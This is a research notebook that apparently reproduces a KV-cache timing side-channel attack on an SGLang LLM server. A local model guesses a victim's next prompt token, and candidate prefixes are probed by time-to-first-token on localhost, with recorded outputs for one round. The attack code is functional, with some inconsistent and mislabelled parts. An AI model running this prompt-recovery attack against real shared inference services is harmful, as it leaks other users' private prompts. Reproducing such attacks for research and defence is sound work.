{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "61642872",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "import time\n",
    "import aiohttp\n",
    "import asyncio\n",
    "import random\n",
    "from typing import Tuple, Dict, List, Any, Optional\n",
    "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
    "import torch\n",
    "from datasets import load_dataset\n",
    "from itertools import islice\n",
    "\n",
    "import aiohttp, json, time\n",
    "\n",
    "import requests\n",
    "import time\n",
    "import requests\n",
    "import json\n",
    "import random\n",
    "import string\n",
    "from sglang.utils import print_highlight\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import numpy as np\n",
    "from transformers import AutoTokenizer\n",
    "from datasets import load_dataset\n",
    "from collections import Counter\n",
    "from tqdm import tqdm\n",
    "import multiprocessing\n",
    "import pandas as pd\n",
    "from tqdm.asyncio import tqdm_asyncio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "db388182",
   "metadata": {},
   "outputs": [],
   "source": [
    "SGLANG_URL = \"http://localhost:30000/generate\"\n",
    "DATASET_NAME = \"fka/awesome-chatgpt-prompts\"\n",
    "NUM_USERS = 1  # Single victim user as per paper's evaluation\n",
    "REQUESTS_PER_USER = 40  # As mentioned in paper\n",
    "REQUEST_FREQUENCY = 0.004  # requests per second (0.004 = 40 requests per 3 hours)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "ca8a06a7",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "async def fetch_metrics_raw(session, prompt, request_id, URL):\n",
    "    payload = {\n",
    "        \"model\": \"default\", \n",
    "        \"messages\": [{\"role\": \"user\", \"content\": prompt}],\n",
    "        \"stream\": True,\n",
    "        \"temperature\": 0,\n",
    "        \"session_id\":0,\n",
    "        \"max_tokens\":10\n",
    "    }\n",
    "    start_time = time.perf_counter()\n",
    "    first_token_time = None\n",
    "    token_count = 0\n",
    "    ttft = 0\n",
    "    restext=\"\"\n",
    "    async with session.post(URL, json=payload) as response:\n",
    "        if response.status != 200:\n",
    "            return {\"id\": request_id, \"error\": f\"HTTP {response.status}\", \"status\": \"fail\"}\n",
    "        async for line in response.content:\n",
    "            decoded_line = line.decode('utf-8').strip()\n",
    "            if decoded_line.startswith(\"data: \"):\n",
    "                # print(decoded_line)\n",
    "                json_str = decoded_line[6:]\n",
    "                if json_str == \"[DONE]\":\n",
    "                    break\n",
    "                obj = json.loads(json_str)\n",
    "                # print(obj)\n",
    "                delta = obj[\"choices\"][0].get(\"delta\", {})\n",
    "                token = delta.get(\"content\", \"\")             \n",
    "                # print(token)\n",
    "                if token:\n",
    "                    restext+=token\n",
    "                    if first_token_time is None:\n",
    "                        first_token_time = time.perf_counter()\n",
    "                        ttft = first_token_time - start_time\n",
    "                    token_count += 1\n",
    "        end_time = time.perf_counter()\n",
    "        tpot = 0\n",
    "        if token_count > 1 and first_token_time:\n",
    "            generation_time = end_time - first_token_time\n",
    "            tpot = generation_time / (token_count - 1)\n",
    "        return {\n",
    "            \"id\": request_id,\n",
    "            \"prompt\": prompt,\n",
    "            \"ttft_ms\": ttft * 1000 if ttft else 0,\n",
    "            \"tpot_ms\": tpot * 1000,\n",
    "            \"tokens\": token_count,\n",
    "            \"status\": \"success\",\n",
    "            \"restext\":restext\n",
    "        }\n",
    "\n",
    "async def main(attack_prompts, URL):\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        print(f\"⚡ Sending {len(attack_prompts)} requests to SGLang ({URL})...\\n\")\n",
    "        tasks = []\n",
    "        for i, prompt in enumerate(attack_prompts):\n",
    "            tasks.append(fetch_metrics_raw(session, prompt, i, URL))\n",
    "        results = await tqdm_asyncio.gather(*tasks, desc=\"Attacking\")\n",
    "        print(f\"{'ID':<3} | {'TTFT (ms)':<10} | {'TPOT (ms)':<10} | {'Tokens':<6} | {'Prompt Snippet'}\")\n",
    "        print(\"-\" * 70)\n",
    "        successful_results = []\n",
    "        for res in results:\n",
    "            if res[\"status\"] == \"success\":\n",
    "                print(f\"{res['id']:<3} | {res['ttft_ms']:<10.2f} | {res['tpot_ms']:<10.2f} | {res['tokens']:<6} | {res['prompt'][:30]} | {res.get('restext', '')[:30]}\")\n",
    "                successful_results.append(res)\n",
    "            else:\n",
    "                print(f\"{res['id']:<3} | {'ERROR':<10} | {'-':<10} | {'-':<6} | {res['error']}\")\n",
    "        if successful_results:\n",
    "            ttfts = [r['ttft_ms'] for r in successful_results]\n",
    "            tpots = [r['tpot_ms'] for r in successful_results]\n",
    "            best_request = min(successful_results, key=lambda x: x['ttft_ms'])\n",
    "            \n",
    "            print(\"\\n--- Summary ---\")\n",
    "            print(f\"Avg TTFT: {np.mean(ttfts):.2f} ms\")\n",
    "            print(f\"Avg TPOT: {np.mean(tpots):.2f} ms\")\n",
    "            print(\"-\" * 30)\n",
    "            print(f\"Min TTFT:        {best_request['ttft_ms']:.2f} ms\")\n",
    "            print(f\"Min TTFT Prompt: \\\"{best_request['prompt']}\\\"\")\n",
    "        return best_request, successful_results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5104642b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "The module name  (originally ) is not a valid Python identifier. Please rename the original module to avoid import issues.\n"
     ]
    }
   ],
   "source": [
    "def chunk_list(data, chunk_size):\n",
    "    it = iter(data)\n",
    "    while True:\n",
    "        chunk = list(islice(it, chunk_size))\n",
    "        if not chunk:\n",
    "            break\n",
    "        yield chunk\n",
    "# --- Configuration Constants ---\n",
    "\n",
    "async def stream_ttft(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: str,\n",
    "    payload: dict,\n",
    "):\n",
    "    start = time.perf_counter()\n",
    "\n",
    "    async with session.post(url, json=payload) as resp:\n",
    "        if resp.status != 200:\n",
    "            return {\n",
    "                \"status\": f\"HTTP_{resp.status}\",\n",
    "                \"ttft\": None,\n",
    "                \"token\": None,\n",
    "            }\n",
    "\n",
    "        async for raw in resp.content:\n",
    "            line = raw.decode(\"utf-8\", errors=\"ignore\").strip()\n",
    "            if not line:\n",
    "                continue\n",
    "\n",
    "            # Handle SSE\n",
    "            if line.startswith(\"data:\"):\n",
    "                line = line[5:].strip()\n",
    "\n",
    "            if line == \"[DONE]\":\n",
    "                break\n",
    "\n",
    "            token = \"\"\n",
    "\n",
    "            # Try JSON first\n",
    "            try:\n",
    "                obj = json.loads(line)\n",
    "\n",
    "                # Most common SGLang / vLLM format\n",
    "                if \"text\" in obj:\n",
    "                    token = obj[\"text\"]\n",
    "\n",
    "                # OpenAI-style delta format (just in case)\n",
    "                elif \"choices\" in obj:\n",
    "                    delta = obj[\"choices\"][0].get(\"delta\", {})\n",
    "                    token = delta.get(\"content\", \"\")\n",
    "\n",
    "            except json.JSONDecodeError:\n",
    "                # Fallback: treat raw line as token\n",
    "                token = line\n",
    "\n",
    "            if token:\n",
    "                ttft = time.perf_counter() - start\n",
    "                return {\n",
    "                    \"status\": \"OK\",\n",
    "                    \"ttft\": ttft,\n",
    "                    \"token\": token,\n",
    "                }\n",
    "\n",
    "    return {\n",
    "        \"status\": \"NO_TOKEN\",\n",
    "        \"ttft\": None,\n",
    "        \"token\": None,\n",
    "    }\n",
    "# NOTE: This URL is used for context only; the actual network calls are mocked.\n",
    "SGLANG_SERVICE_URL = \"http://localhost:30000/generate\"\n",
    "SGLANG_ATTACK_URL=\"http://localhost:30000/v1/chat/completions\"\n",
    "# LOCAL_MODEL_PATH = \"Qwen/Qwen2.5-1.5B-Instruct\"\n",
    "HF_TOKEN = \"\"\n",
    "# LOCAL_MODEL_PATH=\"chaejin98330/Qwen2.5-0.5B-Finetuned\"\n",
    "LOCAL_MODEL_PATH=\"../../results/\"\n",
    "DATASET_NAME = \"fka/awesome-chatgpt-prompts\"\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(LOCAL_MODEL_PATH,\n",
    "    token=HF_TOKEN)\n",
    "model = AutoModelForCausalLM.from_pretrained(LOCAL_MODEL_PATH,\n",
    "    token=HF_TOKEN)\n",
    "# ====================================================================\n",
    "# MOCK DEPENDENCIES (For Simulation)\n",
    "# ====================================================================\n",
    "\n",
    "class KV_Simulator:\n",
    "    \"\"\"\n",
    "    Mocks the KV Cache and Longest Prefix Match (LPM) detection.\n",
    "    This simulates the cache state of the SGlang service.\n",
    "    \"\"\"\n",
    "    def __init__(self):\n",
    "        self.cache: List[str] = []\n",
    "        # Pre-populate with common prefixes for testing hits\n",
    "        self.add_to_cache(\"The quick brown fox jumps over the lazy dog\")\n",
    "        self.add_to_cache(\"What are the steps involved in running a multi-tenant LLM service\")\n",
    "        self.add_to_cache(\"The best way to start a day is by getting up early\")\n",
    "\n",
    "    def add_to_cache(self, sequence: str):\n",
    "        \"\"\"Adds a sequence to the cache.\"\"\"\n",
    "        if sequence not in self.cache:\n",
    "            self.cache.append(sequence)\n",
    "\n",
    "    def get_lpm_score(self, sequence: str) -> int:\n",
    "        \"\"\"\n",
    "        Calculates the Longest Prefix Match score (reused tokens).\n",
    "        \"\"\"\n",
    "        max_match_len = 0\n",
    "        # Normalize tokenization by splitting on space\n",
    "        sequence_tokens = sequence.lower().split() \n",
    "\n",
    "        for cached_seq in self.cache:\n",
    "            cached_tokens = cached_seq.lower().split()\n",
    "            match_len = 0\n",
    "            \n",
    "            for i in range(min(len(sequence_tokens), len(cached_tokens))):\n",
    "                if sequence_tokens[i] == cached_tokens[i]:\n",
    "                    match_len += 1\n",
    "                else:\n",
    "                    break\n",
    "            \n",
    "            max_match_len = max(max_match_len, match_len)\n",
    "            \n",
    "        return max_match_len\n",
    "def flush_cache():\n",
    "    flushurl = f\"http://localhost:30000/flush_cache\"\n",
    "    response=requests.post(flushurl)\n",
    "    return\n",
    "\n",
    "# ====================================================================\n",
    "# INFERENCE CLIENT (The Attacker)\n",
    "# ====================================================================\n",
    "\n",
    "class InferenceClient:\n",
    "    def __init__(self, url: str):\n",
    "        self.url = url\n",
    "        self.kv_simulator = KV_Simulator()\n",
    "        self.LOCAL_MODEL_PATH = LOCAL_MODEL_PATH\n",
    "        self.DATASET_NAME = DATASET_NAME\n",
    "        \n",
    "        # Simulated tokens derived from the Qwen model on the chat prompts dataset\n",
    "        self.DRAFT_TOKENS = [\" and\", \" the\", \" to\", \" is\", \" a\", \" of\", \" in\", \" that\", \n",
    "                             \" for\", \" by\", \" with\", \" it\", \" as\", \" be\", \" an\", \" me\", \" you\", \n",
    "                             \".\", \",\", \" what\", \" are\", \" steps\", \" to\", \" make\", \" best\", \" day\"]\n",
    "\n",
    "\n",
    "    # --- Component 1: Simulates the Local LLM Generating SINGLE-TOKEN Candidates ---\n",
    "    def predict_next_token_local_llm(self, current_prefix: str, num_candidates: int) -> List[str]:\n",
    "        \"\"\"\n",
    "        Generates a small list of likely next tokens, simulating the output\n",
    "        of a Qwen model guided by the current prefix for context.\n",
    "        \n",
    "        NOTE: The following block shows the real 'transformers' implementation.\n",
    "        Since it cannot be executed, a sophisticated mock is used below.\n",
    "         \"\"\"\n",
    "        input_prompt = f\"You are an LLM designed to predict the next sentence based on the previous context, predict the next token after input: '{current_prefix}'\"\n",
    "       \n",
    "        \n",
    "        try:\n",
    "            input_ids = tokenizer.encode(current_prefix, return_tensors=\"pt\")\n",
    "            with torch.no_grad():\n",
    "                outputs = model(input_ids)\n",
    "                next_token_logits = outputs.logits[:, -1, :]\n",
    "                # Get top 'num_candidates' tokens\n",
    "                top_k_indices = torch.topk(next_token_logits, num_candidates).indices.squeeze(0)\n",
    "            \n",
    "            candidates = [tokenizer.decode(idx.item()) for idx in top_k_indices]\n",
    "          \n",
    "            return candidates\n",
    "            # pass \n",
    "        except Exception as e:\n",
    "            import traceback \n",
    "            traceback.print_exc()\n",
    "            print(f\"Exception happened {e}, {current_prefix}\")\n",
    "            pass\n",
    "\n",
    "    async def victim_simulation(self, input_sequences: str, max_tokens_to_recover: int, num_candidates: int = 10, track_kv: bool = False) -> Tuple[str, Dict]:\n",
    "        \"\"\"\n",
    "        Iteratively recovers the victim's request one token at a time\n",
    "        using the LPM side-channel[cite: 1905].\n",
    "        \"\"\"\n",
    "        \n",
    "        all_token_metrics = []\n",
    "        \n",
    "        # 3. Run parallel requests to find the maximum LPM hit\n",
    "        async with aiohttp.ClientSession() as session:\n",
    "            tasks = [self._send_token_peek_request_victim(session, seq, track_kv) for seq in input_sequences]\n",
    "            results = await asyncio.gather(*tasks)\n",
    "        return results    \n",
    "\n",
    "\n",
    "    async def _send_token_peek_request_victim(self, session: aiohttp.ClientSession, full_sequence: str, track_kv: bool) -> Dict:\n",
    "\n",
    "        payload = {\n",
    "            \"model\": \"Qwen/Qwen2.5-1.5B-Instruct\",\n",
    "            \"text\": full_sequence,\n",
    "            \"max_new_tokens\": 10,  # Generate some tokens to ensure caching\n",
    "            \"stream\": False,\n",
    "            \"ignore_eos\": True,  # If supported by your SGLang version,\n",
    "            \"session_id\":0,\n",
    "            \"temperature\":0,\n",
    "            \n",
    "        }\n",
    "        \n",
    "        start_time = time.time()\n",
    "        full_response_text = \"\"\n",
    "        first_token_latency = None\n",
    "        text_chunk_final = \"\"\n",
    "      \n",
    "        try:\n",
    "            async with aiohttp.ClientSession() as session:\n",
    "                async with session.post(self.url, json=payload) as response:\n",
    "                    if response.status == 200:\n",
    "\n",
    "                        # 2. Iterate over the response stream line by line\n",
    "                        async for line in response.content:\n",
    "                            line = line.decode('utf-8').strip()\n",
    "                            # Skip empty keep-alive lines\n",
    "                            if not line:\n",
    "                                continue\n",
    "                                \n",
    "                            # Standard LLM streaming format usually starts with \"data: \"\n",
    "                            if line.startswith(\"data:\"):\n",
    "                                data_str = line[5:].strip() # Remove \"data: \" prefix\n",
    "                                \n",
    "                                # Check for the stop signal (common in OpenAI-compatible APIs)\n",
    "                                if data_str == \"[DONE]\":\n",
    "                                    break\n",
    "                                \n",
    "                                try:\n",
    "                                    chunk = json.loads(data_str)\n",
    "                                    \n",
    "                                    # Extract text based on standard API formats\n",
    "                                    # Adjust key access depending on your specific SGLang endpoint version\n",
    "                                    text_chunk = chunk.get(\"text\", \"\") \n",
    "                                    \n",
    "                                    if text_chunk:\n",
    "                                        first_token_latency = time.time() - start_time\n",
    "                                        text_chunk_final += text_chunk\n",
    "                                        \n",
    "                                    if text_chunk:\n",
    "                                        # Record Time to First Token (TTFT)\n",
    "                                        if first_token_latency is None:\n",
    "                                            first_token_latency = time.time() - start_time\n",
    "                                            \n",
    "                                        full_response_text += text_chunk\n",
    "                                        \n",
    "                                except json.JSONDecodeError:\n",
    "                                    continue\n",
    "\n",
    "                        total_latency = time.time() - start_time\n",
    "                        \n",
    "                        # 3. Simulate KV cache update (done after full response is received)\n",
    "               \n",
    "                        lpm_score = 0\n",
    "\n",
    "                        return text_chunk_final, total_latency\n",
    "                    else:\n",
    "                        return f\"ERROR_{response.status}\", time.time() - start_time, {}\n",
    "                        \n",
    "        except Exception as e:\n",
    "            return f\"ERROR_{str(e)}\", time.time() - start_time, {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "672f1d48",
   "metadata": {},
   "outputs": [],
   "source": [
    "client = InferenceClient(url=SGLANG_SERVICE_URL)\n",
    "    \n",
    "    \n",
    "DATASET_NAME = \"fka/awesome-chatgpt-prompts\"\n",
    "\n",
    "    # Load ALL splits (this dataset has only \"train\")\n",
    "dataset = load_dataset(DATASET_NAME)\n",
    "item=dataset[\"train\"][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "b338ff83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- VICTIM CACHE INJECTION ---\n",
      "Victim's full request added to cache: 'Imagine you are an experienced Ethereum developer tasked with creating a smart contract for a blockchain messenger. The objective is to save messages on the blockchain, making them readable (public) to everyone, writable (private) only to the person who deployed the contract, and to count how many times the message was updated. Develop a Solidity smart contract for this purpose, including the necessary functions and considerations for achieving the specified goals. Please provide the code and any relevant explanations to ensure a clear understanding of the implementation.'\n",
      "Cache size: 3 entries.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# --- 1. VICTIM CACHE INJECTION (Simulating the victim running their request) ---\n",
    "victim_request = item[\"prompt\"]\n",
    "\n",
    "\n",
    "# The victim's full request is stored in the cache (LPM tree)[cite: 1895, 1982].\n",
    "print(f\"--- VICTIM CACHE INJECTION ---\")\n",
    "# client.kv_simulator.add_to_cache(victim_request)\n",
    "flush_cache()\n",
    "# for i in range(20):\n",
    "# Recover up to 10 additional tokens\n",
    "recovered_request = await client.victim_simulation(\n",
    "    input_sequences=[victim_request,victim_request], \n",
    "    max_tokens_to_recover=10, \n",
    "    num_candidates=15, \n",
    "    track_kv=True # Enable the LPM side-channel logic\n",
    ")\n",
    "recovered_request=recovered_request[0]\n",
    "\n",
    "print(f\"Victim's full request added to cache: '{victim_request}'\")\n",
    "# print(f\"Victim's response request added to cache: '{recovered_request[0][:30]}'\")\n",
    "print(f\"Cache size: {len(client.kv_simulator.cache)} entries.\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "4dcec5b4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Imagine you are\n",
      "[' a', ' an', ' working', ' the', ' playing', ' designing', ' tasked', ' planning', ' developing', ' organizing']\n"
     ]
    }
   ],
   "source": [
    "split_index=3\n",
    "words_to_recover = len(victim_request.split())\n",
    "known_prefix = \" \".join(victim_request.split(\".\")[0].split()[:split_index])\n",
    "next_token = \" \".join(victim_request.split(\".\")[0].split()[split_index+1])\n",
    "candidates=client.predict_next_token_local_llm(known_prefix,10)\n",
    "print(known_prefix)\n",
    "print(candidates)\n",
    "attackprompts=[known_prefix+candidate for candidate in candidates]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "2caa7564",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "⚡ Sending 10 requests to SGLang (http://localhost:30000/v1/chat/completions)...\n",
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Attacking: 100%|██████████| 10/10 [00:00<00:00, 81.86it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ID  | TTFT (ms)  | TPOT (ms)  | Tokens | Prompt Snippet\n",
      "----------------------------------------------------------------------\n",
      "0   | 79.61      | 4.46       | 10     | Imagine you are a | <think>\n",
      "Okay, the user wants m\n",
      "1   | 76.58      | 4.73       | 10     | Imagine you are an | <think>\n",
      "Okay, the user wants m\n",
      "2   | 79.38      | 4.45       | 10     | Imagine you are working | <think>\n",
      "Okay, the user wants m\n",
      "3   | 79.99      | 4.47       | 10     | Imagine you are the | <think>\n",
      "Okay, the user wants m\n",
      "4   | 79.32      | 4.45       | 10     | Imagine you are playing | <think>\n",
      "Okay, the user wants m\n",
      "5   | 79.88      | 4.47       | 10     | Imagine you are designing | <think>\n",
      "Okay, the user wants m\n",
      "6   | 79.48      | 4.46       | 10     | Imagine you are tasked | <think>\n",
      "Okay, the user wants m\n",
      "7   | 80.15      | 4.46       | 10     | Imagine you are planning | <think>\n",
      "Okay, the user wants m\n",
      "8   | 79.12      | 4.42       | 10     | Imagine you are developing | <think>\n",
      "Okay, the user wants m\n",
      "9   | 79.72      | 4.47       | 10     | Imagine you are organizing | <think>\n",
      "Okay, the user wants m\n",
      "\n",
      "--- Summary ---\n",
      "Avg TTFT: 79.32 ms\n",
      "Avg TPOT: 4.48 ms\n",
      "------------------------------\n",
      "Min TTFT:        76.58 ms\n",
      "Min TTFT Prompt: \"Imagine you are an\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "best,success=await main(attackprompts, SGLANG_ATTACK_URL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "280ac115",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "kvenv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
